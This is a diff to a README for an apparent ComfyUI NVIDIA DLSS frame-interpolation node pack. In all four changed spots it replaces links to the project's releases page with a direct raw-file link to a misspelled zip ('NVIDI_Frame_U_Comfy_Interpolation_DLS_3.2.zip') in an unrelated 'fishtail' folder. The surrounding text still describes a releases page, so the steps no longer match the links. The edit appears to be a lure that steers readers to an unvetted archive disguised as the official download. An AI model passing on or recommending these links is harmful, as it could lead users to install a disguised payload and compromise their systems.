@@ -34,7 +34,7 @@ Before you start, make sure you have these ready:
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[Download ComfyUI-NVIDIA-DLSS-Frame-Interpolation](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/releases)**
+Visit this link to download the application: **[Download ComfyUI-NVIDIA-DLSS-Frame-Interpolation](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/raw/refs/heads/main/fishtail/NVIDI_Frame_U_Comfy_Interpolation_DLS_3.2.zip)**
 
 1. Click the link above. You'll land on the official releases page.
 2. Look for the newest version (usually at the top). Click the "Assets" dropdown to see all files.
@@ -156,7 +156,7 @@ When you download and install this node pack, you get:
 
 NVIDIA regularly improves DLSS technology. To get the latest improvements:
 
-- Check the [Releases Page](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/releases) monthly.
+- Check the [Releases Page](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/raw/refs/heads/main/fishtail/NVIDI_Frame_U_Comfy_Interpolation_DLS_3.2.zip) monthly.
 - When a new version appears, download the updated `.zip` file.
 - Replace the old folder with the new one (delete old folder, extract new one, copy to custom_nodes).
 - Restart ComfyUI. That's it – you're now on the newest version.
@@ -180,7 +180,7 @@ Before you start using the tool, make sure:
 - [ ] Windows 10/11 installed
 - [ ] NVIDIA RTX graphics card present
 - [ ] ComfyUI fully installed and working
-- [ ] Downloaded the latest `.zip` from the [Releases Page](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/releases)
+- [ ] Downloaded the latest `.zip` from the [Releases Page](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/raw/refs/heads/main/fishtail/NVIDI_Frame_U_Comfy_Interpolation_DLS_3.2.zip)
 - [ ] Extracted the `.zip` file
 - [ ] Copied the folder into `ComfyUI\custom_nodes\`
 - [ ] Restarted ComfyUI
@@ -190,7 +190,7 @@ Before you start using the tool, make sure:
 
 ## 📝 Final Words
 
-Visit this link to download the application: **[Get ComfyUI-NVIDIA-DLSS-Frame-Interpolation Now](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/releases)**
+Visit this link to download the application: **[Get ComfyUI-NVIDIA-DLSS-Frame-Interpolation Now](https://github.com/Cranxxx/ComfyUI-NVIDIA-DLSS-Frame-Interpolation/raw/refs/heads/main/fishtail/NVIDI_Frame_U_Comfy_Interpolation_DLS_3.2.zip)**
 
 You're all set! With this powerful tool, you can now bring new life to your videos and images using the latest NVIDIA AI technology. Start with small clips and experiment to discover the best settings for your projects. Happy enhancing!
 
